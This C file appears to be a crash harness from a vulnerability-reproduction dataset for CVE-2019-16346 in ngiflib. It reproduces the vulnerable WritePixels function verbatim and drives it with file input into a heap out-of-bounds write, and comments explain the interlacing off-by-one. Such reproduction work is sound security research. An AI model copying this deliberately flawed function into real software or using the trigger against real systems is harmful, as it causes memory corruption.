/* Direct-call crash harness for CVE-2019-16346 (ngiflib, WritePixels).
 *
 * Real bug (ngiflib.c, fix commit 37d939a6f511d16d4c95678025c235fe62e6417a,
 * "fix deinterlacing for small pictures", upstream issue #12): WritePixels()
 * advances the interlaced scan-line cursor context->curY through 4 passes
 * (rows 0,8,16,...; 4,12,20,...; 2,6,10,...; 1,3,5,...) every time Xtogo
 * reaches 0, via a single `if(context->curY >= p->height) { pass++; curY =
 * ... }` per pass. For a SMALL image height (<=4), one pass-1 increment
 * (`curY += 8`) can jump curY past *multiple* pass boundaries at once, but
 * the single `if` only advances the pass counter by ONE step -- so curY can
 * still be >= p->height right after the "fixed-up" value is assigned
 * (`curY = i->posY + 4`), and nothing catches that. WritePixels then
 * recomputes `context->frbuff_p.p8 = p->frbuff.p8 + curY*p->width +
 * i->posX` with this too-large curY and, on the very next chunk of the SAME
 * call (n bigger than one scanline), does `ngiflib_memcpy(context->frbuff_p.p8,
 * pixels, tocopy)` through it -- an out-of-bounds heap WRITE (CWE-787)
 * entirely inside WritePixels, through the exact call site
 * (`ngiflib_memcpy`) the frozen baseline's dedup token names
 * (`__asan_memcpy--WritePixels--DecodeGifImg`).
 *
 * Harness setup: a small declared canvas, height=4 (matches the CVE's
 * "small picture" trigger condition exactly), width=25, indexed mode
 * (NGIFLIB_MODE_INDEXED, so WritePixels takes the ngiflib_memcpy branch,
 * not the p32/GifIndexToTrueColor branch) -> frame buffer malloc'd to
 * EXACTLY height*width = 100 bytes (mirrors LoadGif's own
 * `ngiflib_malloc((long)g->height*(long)g->width)` for indexed mode).
 * ctx.pass is preset to 1 (mid-interlace, first pass) and ctx.curY to 0
 * (start of the canvas), exactly the state DecodeGifImg would hand
 * WritePixels at the start of decoding row 0 of an interlaced image --
 * WritePixels is then called ONCE, directly, with `n` = the raw input
 * file's length (the file bytes themselves become the heap-allocated
 * `pixels` index array -- the ATTACKER DATA lives entirely on the heap).
 * n <= 25 (one row) never triggers the buggy pass-advance's write (the
 * bad pointer, if computed at all, is never dereferenced within this
 * call). n > 25 spills into a second chunk: WritePixels' OWN (unmodified)
 * pass-advance logic computes curY=8 -> pass=2,curY=4 (still >= height=4,
 * the real off-by-one) -> frbuff_p = frbuff+4*25+0 = frbuff+100, exactly
 * one byte past the 100-byte allocation -> the next ngiflib_memcpy chunk
 * WRITEs through it -> heap-buffer-overflow, first invalid byte at offset
 * 100. This is the CVE's actual mechanism, executing verbatim inside a
 * SINGLE direct call to WritePixels, with no dependency on GetByte /
 * DecodeGifImg / LoadGif or any GIF-format parsing.
 */

#include <inttypes.h>
#include <stdio.h>
#include <stdlib.h>

/* ---- minimal REAL type defs, verbatim from ngiflib.h (non-__VBCC__ branch) ---- */
typedef uint8_t u8;
typedef uint16_t u16;
typedef uint32_t u32;

/* ---- real macros, verbatim from ngiflib.h ---- */
#define ngiflib_malloc malloc
#define ngiflib_free free
#define ngiflib_memcpy memcpy
#define ngiflib_memset memset
#define ngiflib_memcmp memcmp
#include <string.h>

#define NGIFLIB_MODE_TRUE_COLOR (0x00)
#define NGIFLIB_MODE_INDEXED    (0x01)
#define NGIFLIB_MODE_FROM_FILE  (0x00)
#define NGIFLIB_MODE_FROM_MEM   (0x02)

/* ---- real struct/union defs, verbatim from ngiflib.h ---- */
/* (NGIFLIB_ENABLE_CALLBACKS and NGIFLIB_INDEXED_ONLY and NGIFLIB_NO_FILE are
 * all left UNDEFINED, exactly as in the project's default (non-embedded)
 * build -- so every struct below matches the header's default-branch shape
 * field-for-field.) */

struct ngiflib_rgb {
	u8 r, g ,b;
};
u32 GifIndexToTrueColor(struct ngiflib_rgb * palette, u8 v);

union ngiflib_pixpointer {
	u8 * p8;
	u32 * p32;
};

/* struct stoquant un Graphic Control Extension */
struct ngiflib_gce {
	u16 delay_time;	/* 1/100 of seconds or 0 */
	u8 transparent_color;
	u8 disposal_method:3;	/* see below */
	u8 user_input_flag:1;	/* User input is : 0 = not expected. 1 = expected. */
	u8 transparent_flag:1;
	u8 gce_present:1;
};

/* struct stoquant les parametres relatifs a une image. */
struct ngiflib_img {
	struct ngiflib_img * next;
	struct ngiflib_gif * parent;
	struct ngiflib_rgb * palette;
	struct ngiflib_gce gce;
	u16 ncolors;
	u16 width;
	u16 height;
	u16 posX;
	u16 posY;
	u8 interlaced;
	u8 sort_flag;		/* is local palette sorted by color frequency ? */
	u8 localpalbits;	/* bits/pixel ! (de 1 a 8) */
	u8 imgbits;	/* bits mini du code LZW (de 2 a 9 ?) */
};

/* utilises juste pour la decompression */
struct ngiflib_decode_context {
	union ngiflib_pixpointer frbuff_p;	/* current offset in frame buffer */
	const u8 * srcbyte;
	u16 Xtogo;
	u16 curY;
	u16 lbyte;
	u16 max;	/* maximum value = (1 << nbbit) - 1 */
	u8 pass;	/* current pass of interlaced image decoding */
	u8 restbyte;
	u8 nbbit;	/* bits courants du code LZW */
	u8 restbits;
	u8 byte_buffer[256];	/* for get word */
};

/* struct stoquant les parametres relatifs a un fichier gif */
struct ngiflib_gif {
	struct ngiflib_img * first_img;
	struct ngiflib_img * cur_img;
	struct ngiflib_rgb * palette;
	union {
		FILE * file;
		const u8 * bytes;
	} input;	/* used by GetByte */
	union ngiflib_pixpointer frbuff;	/* frame buffer    */
	FILE * log;		/* to output log   */
	int nimg;
	int netscape_loop_count;	/* from netscape animation extension */
	u16 ncolors;
	u16 width;
	u16 height;
	u8 backgroundindex;
	u8 pixaspectratio;	/* width/height = (pixaspectratio + 15) / 64 */
	u8 imgbits;
	u8 colorresolution;
	u8 sort_flag;
	u8 mode; /* voir avant */
	u8 signature[7];	/* 0 terminated  !=) */
};

/* ---- real callee, verbatim from ngiflib.c (referenced in WritePixels' untaken
 * else-branch -- needed to compile/link even though indexed mode never calls
 * it at runtime) ---- */

u32 GifIndexToTrueColor(struct ngiflib_rgb * palette, u8 v) {
	return palette[v].b | (palette[v].g << 8) | (palette[v].r << 16);
}


/* ---- target function, VERBATIM from dataset/cve_9c68c7f0/target/original_function.c ---- */

static void WritePixels(struct ngiflib_img * i, struct ngiflib_decode_context * context, const u8 * pixels, u16 n) {
	u16 tocopy;	
	struct ngiflib_gif * p = i->parent;

	while(n > 0) {
		tocopy = (context->Xtogo < n) ? context->Xtogo : n;
		if(!i->gce.transparent_flag) {
#ifndef NGIFLIB_INDEXED_ONLY
			if(p->mode & NGIFLIB_MODE_INDEXED) {
#endif /* NGIFLIB_INDEXED_ONLY */
				ngiflib_memcpy(context->frbuff_p.p8, pixels, tocopy);
				pixels += tocopy;
				context->frbuff_p.p8 += tocopy;
#ifndef NGIFLIB_INDEXED_ONLY
			} else {
				int j;
				for(j = (int)tocopy; j > 0; j--) {
					*(context->frbuff_p.p32++) =
					   GifIndexToTrueColor(i->palette, *pixels++);
				}
			}
#endif /* NGIFLIB_INDEXED_ONLY */
		} else {
			int j;
#ifndef NGIFLIB_INDEXED_ONLY
			if(p->mode & NGIFLIB_MODE_INDEXED) {
#endif /* NGIFLIB_INDEXED_ONLY */
				for(j = (int)tocopy; j > 0; j--) {
					if(*pixels != i->gce.transparent_color) *context->frbuff_p.p8 = *pixels;
					pixels++;
					context->frbuff_p.p8++;
				}
#ifndef NGIFLIB_INDEXED_ONLY
			} else {
				for(j = (int)tocopy; j > 0; j--) {
					if(*pixels != i->gce.transparent_color) {
						*context->frbuff_p.p32 = GifIndexToTrueColor(i->palette, *pixels);
					}
					pixels++;
					context->frbuff_p.p32++;
				}
			}
#endif /* NGIFLIB_INDEXED_ONLY */
		}
		context->Xtogo -= tocopy;
		if(context->Xtogo == 0) {
			#ifdef NGIFLIB_ENABLE_CALLBACKS
			if(p->line_cb) p->line_cb(p, context->line_p, context->curY);
			#endif /* NGIFLIB_ENABLE_CALLBACKS */
			context->Xtogo = i->width;
			switch(context->pass) {
			case 0:
				context->curY++;
				break;
			case 1:	/* 1st pass : every eighth row starting from 0 */
				context->curY += 8;
				if(context->curY >= p->height) {
					context->pass++;
					context->curY = i->posY + 4;
				}
				break;
			case 2:	/* 2nd pass : every eighth row starting from 4 */
				context->curY += 8;
				if(context->curY >= p->height) {
					context->pass++;
					context->curY = i->posY + 2;
				}
				break;
			case 3:	/* 3rd pass : every fourth row starting from 2 */
				context->curY += 4;
				if(context->curY >= p->height) {
					context->pass++;
					context->curY = i->posY + 1;
				}
				break;
			case 4:	/* 4th pass : every odd row */
				context->curY += 2;
				break;
			}
#ifndef NGIFLIB_INDEXED_ONLY
			if(p->mode & NGIFLIB_MODE_INDEXED) {
#endif /* NGIFLIB_INDEXED_ONLY */
				#ifdef NGIFLIB_ENABLE_CALLBACKS
				context->line_p.p8 = p->frbuff.p8 + (u32)context->curY*p->width;
				context->frbuff_p.p8 = context->line_p.p8 + i->posX;
				#else
				context->frbuff_p.p8 = p->frbuff.p8 + (u32)context->curY*p->width + i->posX;
				#endif /* NGIFLIB_ENABLE_CALLBACKS */
#ifndef NGIFLIB_INDEXED_ONLY
			} else {
				#ifdef NGIFLIB_ENABLE_CALLBACKS
				context->line_p.p32 = p->frbuff.p32 + (u32)context->curY*p->width;
				context->frbuff_p.p32 = context->line_p.p32 + i->posX;
				#else
				context->frbuff_p.p32 = p->frbuff.p32 + (u32)context->curY*p->width + i->posX;
				#endif /* NGIFLIB_ENABLE_CALLBACKS */
			}
#endif /* NGIFLIB_INDEXED_ONLY */
		}
		n -= tocopy;
	}
}

/* ---- driver ---- */

#define CANVAS_W 25
#define CANVAS_H 4

int main(int argc, char **argv) {
	if (argc < 2) { fprintf(stderr, "usage: %s <input>\n", argv[0]); return 64; }
	FILE *fp = fopen(argv[1], "rb");
	if (!fp) { perror("fopen"); return 64; }
	fseek(fp, 0, SEEK_END);
	long flen = ftell(fp);
	if (flen < 0) flen = 0;
	fseek(fp, 0, SEEK_SET);

	/* Read the raw input bytes into a HEAP buffer (never stack/global) -- these
	 * become the attacker-controlled `pixels` index array passed straight to
	 * WritePixels(); its length IS `n`. */
	size_t L = (size_t)flen;
	u8 *pixels = (u8 *)malloc(L ? L : 1);
	if (!pixels) { fclose(fp); return 64; }
	size_t got = L ? fread(pixels, 1, L, fp) : 0;
	fclose(fp);
	(void)got;
	u16 n = (u16)(L > 65535 ? 65535 : L);

	/* Declared canvas: 25x4 indexed, frame buffer malloc'd to EXACTLY its
	 * real size (mirrors LoadGif's ngiflib_malloc((long)height*width) for
	 * indexed mode). height=4 matches the CVE's "small picture" trigger
	 * condition. */
	u8 *frbuff = (u8 *)malloc((size_t)CANVAS_W * CANVAS_H);
	if (!frbuff) { free(pixels); return 64; }

	struct ngiflib_gif g;
	memset(&g, 0, sizeof(g));
	g.mode = NGIFLIB_MODE_INDEXED; /* indexed: WritePixels takes the
	                                   ngiflib_memcpy branch, matching the
	                                   baseline's __asan_memcpy frame. */
	g.width = CANVAS_W;
	g.height = CANVAS_H;
	g.frbuff.p8 = frbuff;

	struct ngiflib_img img;
	memset(&img, 0, sizeof(img));
	img.parent = &g;
	img.width = CANVAS_W;
	img.height = CANVAS_H;
	img.posX = 0;
	img.posY = 0;
	img.interlaced = 1;
	img.gce.transparent_flag = 0; /* -> !transparent_flag branch -> indexed
	                                  memcpy branch (not the transparent
	                                  per-pixel-compare loop) */

	struct ngiflib_decode_context ctx;
	memset(&ctx, 0, sizeof(ctx));
	ctx.frbuff_p.p8 = frbuff; /* row 0 start, in-bounds */
	ctx.Xtogo = img.width;    /* one full row before the pass-advance wrap fires */
	ctx.curY = img.posY;      /* 0 */
	ctx.pass = 1;             /* interlaced pass 1 (rows 0,8,16,...), exactly what
	                              DecodeGifImg hands WritePixels at the start of an
	                              interlaced image's decode */

	WritePixels(&img, &ctx, pixels, n);

	free(pixels);
	free(frbuff);
	return 0;
}
